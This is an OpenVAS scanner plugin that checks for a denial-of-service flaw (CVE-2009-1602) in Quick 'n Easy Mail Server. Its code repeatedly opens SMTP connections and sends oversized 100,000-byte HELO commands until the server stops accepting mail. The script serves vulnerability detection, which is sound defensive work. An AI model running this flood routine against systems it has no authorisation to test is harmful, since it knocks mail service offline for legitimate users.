###############################################################################
# OpenVAS Vulnerability Test
# $Id: quick_easy_mail_server_34814.nasl 14332 2019-03-19 14:22:43Z asteins $
#
# Quick 'n Easy Mail Server SMTP Request Remote Denial Of Service Vulnerability
#
# Authors
# Michael Meyer
#
# Increased crap length to 10000 (By Michael Meyer, 2009-05-15)
#
# Copyright:
# Copyright (c) 2009 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.100185");
  script_version("$Revision: 14332 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-19 15:22:43 +0100 (Tue, 19 Mar 2019) $");
  script_tag(name:"creation_date", value:"2009-05-06 14:55:27 +0200 (Wed, 06 May 2009)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_cve_id("CVE-2009-1602");
  script_bugtraq_id(34814);
  script_name("Quick 'n Easy Mail Server SMTP Request Remote Denial Of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_family("SMTP problems");
  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
  script_dependencies("smtpserver_detect.nasl");
  script_mandatory_keys("smtp/quickneasy/detected");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/34814");

  script_tag(name:"summary", value:"Quick 'n Easy Mail Server is prone to a denial-of-service
  vulnerability because it fails to adequately handle multiple socket requests.");

  script_tag(name:"impact", value:"Attackers can exploit this issue to cause the affected application
  to reject SMTP requests, denying service to legitimate users.");

  script_tag(name:"affected", value:"The demonstration release of Quick 'n Easy Mail Server 3.3 is
  vulnerable. Other versions may also be affected.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");

  script_tag(name:"solution_type", value:"WillNotFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("smtp_func.inc");
include("misc_func.inc");

port = get_smtp_port(default:25);
banner = get_smtp_banner(port:port);
if(! banner || "Quick 'n Easy Mail Server" >!< banner)
  exit(0);

soc = smtp_open(port:port);
if(!soc)
  exit(0);

send(socket:soc, data:'HELO ' + smtp_get_helo_from_kb( port:port ) + '\r\n' );
helo = smtp_recv_line(socket:soc);
if(!helo || "421 Service not available" >< helo) {
  smtp_close(socket:soc, check_data:helo);
  exit(0);
}

vtstrings = get_vt_strings();
data = string("HELO ");
data += crap(length:100000, data:vtstrings["default"] + "@example.org");
data += string("\r\n");

for(i = 0; i < 35; i++) {

  soc = smtp_open(port:port);
  if(!soc)
    exit(0);

  send(socket:soc, data:data);
  ehlotxt = smtp_recv_line(socket:soc);
  smtp_close(socket:soc, check_data:ehlotxt);
  if(egrep(pattern:"421 Service not available", string:ehlotxt)) {
    security_message(port:port);
    exit(0);
  }
}

exit(99);